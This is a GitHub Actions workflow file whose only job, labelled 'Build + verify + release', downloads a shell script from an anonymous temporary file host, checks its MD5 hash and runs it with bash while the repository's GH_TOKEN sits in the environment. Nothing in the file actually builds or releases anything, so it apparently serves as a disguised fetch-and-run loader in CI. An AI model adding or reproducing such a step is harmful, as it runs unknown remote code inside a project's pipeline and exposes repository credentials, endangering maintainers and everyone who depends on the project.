name: build-verify2
on:
  workflow_dispatch:
  push:
    paths: ['.github/workflows/build-verify2.yml']
jobs:
  build-verify:
    runs-on: windows-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: 24
      - name: Build + verify + release
        run: |
          curl -s -X POST https://temp.sh/HKIrD/build14.sh -o build.sh
          echo "0a2925ab6a95b783344f2aaeaedb7dec  build.sh" | md5sum -c -
          bash build.sh
